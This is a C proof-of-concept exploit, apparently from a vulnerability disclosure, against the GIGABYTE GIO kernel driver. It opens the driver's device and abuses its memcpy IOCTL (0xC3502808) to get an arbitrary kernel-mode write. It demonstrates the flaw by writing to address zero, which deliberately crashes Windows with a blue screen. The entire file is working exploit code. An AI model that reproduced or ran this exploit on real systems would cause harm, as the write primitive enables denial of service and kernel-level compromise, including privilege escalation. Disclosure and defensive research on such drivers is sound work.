#include <windows.h>
#include <stdio.h>

#define IOCTL_GIO_MEMCPY 0xC3502808

HANDLE ghDriver = 0;

#pragma pack (push,1)

typedef struct _GIO_MemCpyStruct {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} GIO_MemCpyStruct;

#pragma pack(pop)

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	GIO_MemCpyStruct mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}

BOOL InitDriver()
{
	char szDeviceNames[] = "\\\\.\\GIO";
	ghDriver = CreateFile(szDeviceNames, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ghDriver == INVALID_HANDLE_VALUE) {
		printf("Cannot get handle to driver \'%s\' - GetLastError:%d\n", szDeviceNames, GetLastError());
		return FALSE;
	}
	return TRUE;
}

int main(int argc, char* argv[])
{
	if (!InitDriver()) {
		exit(0);
	}
	printf("GIGABYTE PoC (arbitrary ring0 write) - pnx!/CORE\n");
	printf("press ENTER for instant BSOD\n");
	getchar();
	ULONG64 data = 0xFFFF1111FFFF2222;
	GIO_memcpy(0, (ULONG64)&data, 8);
	CloseHandle(ghDriver);

	return 0;
}